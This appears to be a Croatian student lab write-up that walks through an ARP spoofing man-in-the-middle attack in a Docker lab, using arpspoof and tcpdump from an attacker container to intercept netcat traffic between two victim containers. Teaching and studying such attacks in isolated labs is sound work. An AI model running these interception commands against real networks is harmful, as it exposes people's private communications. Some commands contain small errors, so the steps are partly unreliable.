# 1. laboratorijske vježbe

October 12, 2021 

Realizirati man in the middle napad iskorištavanjem ranjivosti ARP protokola. 

Student će testirati napad u virtualiziranoj Docker mreži (Docker container networking) koju čine 3 virtualizirana Docker računala (eng. container): dvije žrtve station-1 i station-2 te napadač evil-station.

- kloniranje Github repozitorija:

```bash
$ git clone https://github.com/mcagalj/SRP-2021-22
```

- promjena direktorija:

```bash
$ cd SRP-2021-22/arp-spoofing/
```

- pokretanje/zaustavljanje virtualiziranog mrežnog scenarija:

```bash
$ chmod +X ./start.sh
$ ./start.sh
$ chmod +X ./stop.sh
$ ./stop.sh
```

- pokretanje shella, dohvat IP adrese i adrese uređaja:

```bash

$ docker ps exec -it sh

$ ifconfig -a
```

```
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.24.0.2  netmask 255.255.0.0  broadcast 172.24.255.255
        ether 02:42:ac:18:00:02  txqueuelen 0  (Ethernet)
```

- provjera je li station-2 na istoj adresi:

```bash
$ ping station-2
```

- pokretanje shella u drugom kontejneru:

```bash
$ docker exec -it station-2 sh
```

- otvaranje servera i klijenta (pomoću netcata):

```bash
$ netcat -lp 9000
$ netcat station-1 9000
```

- pokretanje shella u trećem kontejneru:

```bash
$ docker exec -it evil-station sh
```

- arp spoofing (napad):

```bash
$ arpspoof -t station-1 station-2
$ tcpdump
```

- evil-station sada može očitavati poruke koje si međusobno šalju station-1 i station-2 bez njihovog saznanja o tome (ako evil-station tako poželi, tj. ako proslijedi dalje poruke koje je presreo)
- prekid napada:

```bash
$ echo 0 > /proc/sys/net/ipv4/ip_forward
```